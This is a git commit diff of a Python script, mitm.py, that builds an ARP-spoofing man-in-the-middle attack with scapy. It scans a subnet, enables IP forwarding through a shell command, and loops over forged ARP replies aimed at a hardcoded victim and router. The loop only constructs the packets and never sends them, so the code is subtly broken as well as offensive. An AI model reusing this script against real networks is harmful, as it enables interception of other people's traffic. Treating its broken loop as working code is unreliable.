1e999c3846d9f095f2459268d72e0c6eab2afa40
m4ul <hansonlucas06@gmail.com>
2022-11-04 16:47:45 +0100

    l

--- mitm.py
+++ mitm.py
@@ -1,4 +1,7 @@
 from scapy.all import ARP, Ether, srp
+import os
+
+os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 
 
 
 result = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.5.1.0/24")), timeout=3, verbose=0)[0]
@@ -13,14 +16,14 @@ for sent, received in result:
 for i in range (len(ip)):
     print(ip[i], " = ", mac[i])
 
-print("Chose a victim:")
-victim = int(input())
-print("Chose the router:")
-router = int(input())
+#print("Chose a victim:")
+#victim = int(input())
+#print("Chose the router:")
+#router = int(input())
 
-print ("Victim ip: ", ip[victim-1],"    Victim mac: ", mac[victim-1])
+#print ("Victim ip: ", ip[victim-1],"    Victim mac: ", mac[victim-1])
 
-print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
+#print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
 
 #hwsrc:mac source
 #hwdst: mac dest
@@ -33,8 +36,14 @@ print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
    #     tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
 #except KeyboardInterrupt:
  #   pass
+try:
+    while True:
+        ARP(op = 2, pdst = "10.5.1.2", psrc = "10.5.1.254", hwdst= "08:00:27:b1:49:ab" )
+        ARP(op = 2, pdst = "10.5.1.254", psrc = "10.5.1.2", hwdst= "08:00:27:b1:49:ab")
+except KeyboardInterrupt:
+    pass
+    
 
-packets = [Ether(dst=mac[victim-1]) / ARP(op=2, psrc="10.5.1.3", pdst=ip[victim-1], hwdst=mac[victim-1])]
 
 
     
